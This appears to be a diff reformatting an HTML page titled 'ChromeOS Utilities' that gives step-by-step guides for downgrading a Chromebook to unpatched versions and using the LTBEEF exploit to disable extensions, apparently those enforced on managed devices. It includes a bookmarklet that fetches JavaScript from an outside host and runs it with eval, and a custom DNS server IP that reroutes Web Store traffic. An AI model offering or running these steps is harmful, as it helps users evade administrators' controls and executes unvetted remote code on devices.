@@ -1,149 +1,100 @@
 <!DOCTYPE html>
 <html>
-
 <head>
-	<meta charset="UTF-8">
-	<title>ChromeOS Utilities</title>
-	<style>
-		body {
-			font-family: sans-serif;
-			line-height: 1.6;
-			max-width: 800px;
-			margin: 0 auto;
-			padding: 20px;
-		}
-
-		ul {
-			list-style-type: none;
-			padding-left: 20px;
-		}
-
-		a {
-			text-decoration: none;
-			color: #0366d6;
-		}
-
-		ol {
-			padding-left: 20px;
-		}
-
-		li {
-			margin-bottom: 12px;
-		}
-
-		kbd {
-			background-color: #f7f7f7;
-			border: 1px solid #ccc;
-			border-radius: 3px;
-			box-shadow: 0 1px 0 rgba(0, 0, 0, 0.2);
-			color: #333;
-			display: inline-block;
-			font-size: 0.85em;
-			padding: 1px 5px;
-			white-space: nowrap;
-		}
-
-		code {
-			background-color: #f1f1f1;
-			padding: 2px 4px;
-			border-radius: 4px;
-			font-family: monospace;
-			display: inline-block;
-		}
-
-		pre code {
-			display: block;
-			padding: 10px;
-			overflow-x: auto;
-		}
-
-		.author-info {
-			font-style: italic;
-			color: #555;
-			font-size: 0.95em;
-			margin-bottom: 4px;
-		}
-	</style>
+    <meta charset="UTF-8">
+    <title>ChromeOS Utilities</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            line-height: 1.6;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        ul {
+            list-style-type: none;
+            padding-left: 20px;
+        }
+        a {
+            text-decoration: none;
+            color: #0366d6;
+        }
+        ol {
+            padding-left: 20px;
+        }
+        li {
+            margin-bottom: 12px;
+        }
+        kbd {
+            background-color: #f7f7f7;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            box-shadow: 0 1px 0 rgba(0, 0, 0, 0.2);
+            color: #333;
+            display: inline-block;
+            font-size: 0.85em;
+            padding: 1px 5px;
+            white-space: nowrap;
+        }
+        code {
+            background-color: #f1f1f1;
+            padding: 2px 4px;
+            border-radius: 4px;
+            font-family: monospace;
+            display: inline-block;
+        }
+        pre code {
+            display: block;
+            padding: 10px;
+            overflow-x: auto;
+        }
+        .author-info {
+            font-style: italic;
+            color: #555;
+            font-size: 0.95em;
+            margin-bottom: 4px;
+        }
+    </style>
 </head>
-
 <body>
-	<h1>ChromeOS Utilities</h1>
-	<h3>This collection was created by K-Kscripts! Check out the source <a
-			href="https://github.com/K-KScripts/chromebook-utilities">here</a>.</h3>
-	<h3>Read the <a
-			href="https://github.com/K-KScripts/chromebook-utilities/blob/main/Important/DISCLAIMER.md">disclaimer</a>
-		before viewing this repo further.</h3>
-
-	<hr>
-
-	<h2>1. DOWNGRADE CHROME OS</h2>
-	<p>Downgrading can be used for several exploits, to get to a version that doesn't have patches for certain exploits,
-		such as LTBEEF.</p>
-	<p>This is a built-in feature of ChromeOS.</p>
-
-	<p>You'll need a USB thumb drive with at least 4GB of storage (some boards have smaller or bigger images, so to have
-		a "beefy" USB, I recommend 16GB) and a personal computer with access to downloading extensions.</p>
-
-	<ol>
-		<li>
-			Navigate to <code>chrome://version</code> on the chromebook you wish to downgrade and check for your board
-			under "Platform" (it's the text after stable-channel).
-			<br>
-			<img src="https://user-images.githubusercontent.com/88395302/212484378-65e6e6e3-b995-48a1-b229-3265a4993279.png" alt="Board platform location example" style="max-width: 100%; height: auto; margin-top: 10px; border-radius: 4px; box-shadow: 0 2px 5px rgba(0,0,0,0.15);">
-        </li>
-		<li>Navigate to <a href="https://chrome100.dev" target="_blank">chrome100.dev</a>, press <kbd>Ctrl</kbd> +
-			<kbd>F</kbd> and type in your board.</li>
-		<li>Find and download the chrome version you want to your personal computer.</li>
-		<li>Install the <a
-				href="https://chromewebstore.google.com/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en"
-				target="_blank">Chromebook Recovery Utility</a> onto your personal
-			computer.</li>
-		<li>Open the extension, and click on the settings button in the top right hand corner, click "use local image".
-		</li>
-		<li>Select the recovery image you downloaded from chrome100.</li>
-		<li>Plug in the USB you wish to use, and follow the prompts on the screen.</li>
-		<li>On your chromebook, press <kbd>Esc</kbd> + <kbd>Reload</kbd> + <kbd>Power</kbd> and follow the prompts.</li>
-		<li>On the checking for updates screen, press <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>E</kbd> to skip the
-			"checking for updates" screen.</li>
-	</ol>
-
-	<hr>
-
-	<h2>2. LTBEEF</h2>
-	<div class="author-info">Discovered by Bypassi#7037</div>
-	<div class="author-info">DNS servers hosted by The Greatest Giant#0110</div>
-	<p><strong>Notice:</strong> This exploit has been patched in later versions of 102, and 106+. LTBEEF is an exploit
-		which abuses API endpoints within the Google Chrome Web Store.</p>
-
-	<p>There are several versions of this exploit you can use. Here are the 2 most common options:</p>
-
-	<h3>A. BOOKMARKLETS</h3>
-	<ol>
-		<li>
-			Bookmark the script below:
-			<pre><code>fetch('https://compactcow.com/ltbeef/exploit.js').then(data=>{data.text().then(text=>{eval(text)})});</code></pre>
-			<em style="color: #ca3c3c; font-size: 0.9em;"
-		</li>
-		<li>Navigate to <a href="https://chrome.google.com/webstorex" target="_blank">chrome.google.com/webstorex</a>
-			and click on that bookmark.</li>
-		<li>Flip the switches on the extensions you want to disable. Simple!</li>
-	</ol>
-
-	<h3>B. DNS SERVERS</h3>
-	<p>By changing your DNS server, you can use LTBEEF, even if bookmarklets are blocked.
-	
-  </p>
-	<ol>
-		<li>
-			Go to <strong>Settings &gt; Network &gt; Wi-Fi &gt; Network</strong>, and click on "Custom Name Servers".
-			<br>
-			<img src="https://user-images.githubusercontent.com/88395302/212482302-82334f42-c421-45c2-b210-1e700652b5be.png" alt="DNS Settings screen configuration" style="max-width: 100%; height: auto; margin-top: 10px; border-radius: 4px; box-shadow: 0 2px 5px rgba(0,0,0,0.15);">
-        </li>
-		<li>Set every box inside that input section to the following IP: <code>158.101.114.159</code></li>
-		<li>Navigate to <a href="https://chrome.google.com/webstorex" target="_blank">chrome.google.com/webstorex</a>.
-		</li>
-		<li>Flip the switches on the extensions you want to disable.</li>
-	</ol>
+    <h1>ChromeOS Utilities</h1>
+    <h3>This collection was created by K-Kscripts! Check out the source <a href="https://github.com/K-KScripts/chromebook-utilities">here</a>.</h3>
+    <h3>Read the <a href="https://github.com/K-KScripts/chromebook-utilities/blob/main/Important/DISCLAIMER.md">disclaimer</a> before viewing this repo further.</h3>
+    <hr>
+    <h2>1. DOWNGRADE CHROME OS</h2>
+    <p>Downgrading can be used for several exploits, to get to a version that doesn't have patches for certain exploits, such as LTBEEF.</p>
+    <p>This is a built-in feature of ChromeOS.</p>
+    <p>You'll need a USB thumb drive with at least 4GB of storage (some boards have smaller or bigger images, so to have a "beefy" USB, I recommend 16GB) and a personal computer with access to downloading extensions.</p>
+    <ol>
+        <li> Navigate to <code>chrome://version</code> on the chromebook you wish to downgrade and check for your board under "Platform" (it's the text after stable-channel). <br> <img src="https://user-images.githubusercontent.com/88395302/212484378-65e6e6e3-b995-48a1-b229-3265a4993279.png" alt="Board platform location example" style="max-width: 100%; height: auto; margin-top: 10px; border-radius: 4px; box-shadow: 0 2px 5px rgba(0,0,0,0.15);"> </li>
+        <li>Navigate to <a href="https://chrome100.dev" target="_blank">chrome100.dev</a>, press <kbd>Ctrl</kbd> + <kbd>F</kbd> and type in your board.</li>
+        <li>Find and download the chrome version you want to your personal computer.</li>
+        <li>Install the <a href="https://chromewebstore.google.com/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en" target="_blank">Chromebook Recovery Utility</a> onto your personal computer.</li>
+        <li>Open the extension, and click on the settings button in the top right hand corner, click "use local image". </li>
+        <li>Select the recovery image you downloaded from chrome100.</li>
+        <li>Plug in the USB you wish to use, and follow the prompts on the screen.</li>
+        <li>On your chromebook, press <kbd>Esc</kbd> + <kbd>Reload</kbd> + <kbd>Power</kbd> and follow the prompts.</li>
+        <li>On the checking for updates screen, press <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>E</kbd> to skip the "checking for updates" screen.</li>
+    </ol>
+    <hr>
+    <h2>2. LTBEEF</h2>
+    <div class="author-info">Discovered by Bypassi#7037</div>
+    <div class="author-info">DNS servers hosted by The Greatest Giant#0110</div>
+    <p><strong>Notice:</strong> This exploit has been patched in later versions of 102, and 106+. LTBEEF is an exploit which abuses API endpoints within the Google Chrome Web Store.</p>
+    <p>There are several versions of this exploit you can use. Here are the 2 most common options:</p>
+    <h3>A. BOOKMARKLETS</h3>
+    <ol>
+        <li> Bookmark the script below: <pre><code>fetch('https://compactcow.com/ltbeef/exploit.js').then(data=>{data.text().then(text=>{eval(text)})});</code></pre> </li>
+        <li>Navigate to <a href="https://chrome.google.com/webstorex" target="_blank">chrome.google.com/webstorex</a> and click on that bookmark.</li>
+        <li>Flip the switches on the extensions you want to disable. Simple!</li>
+    </ol>
+    <h3>B. DNS SERVERS</h3>
+    <p>By changing your DNS server, you can use LTBEEF, even if bookmarklets are blocked. </p>
+    <ol>
+        <li> Go to <strong>Settings &gt; Network &gt; Wi-Fi &gt; Network</strong>, and click on "Custom Name Servers". <br> <img src="https://user-images.githubusercontent.com/88395302/212482302-82334f42-c421-45c2-b210-1e700652b5be.png" alt="DNS Settings screen configuration" style="max-width: 100%; height: auto; margin-top: 10px; border-radius: 4px; box-shadow: 0 2px 5px rgba(0,0,0,0.15);"> </li>
+        <li>Set every box inside that input section to the following IP: <code>158.101.114.159</code></li>
+        <li>Navigate to <a href="https://chrome.google.com/webstorex" target="_blank">chrome.google.com/webstorex</a>. </li>
+        <li>Flip the switches on the extensions you want to disable.</li>
+    </ol>
 </body>
-
 </html>
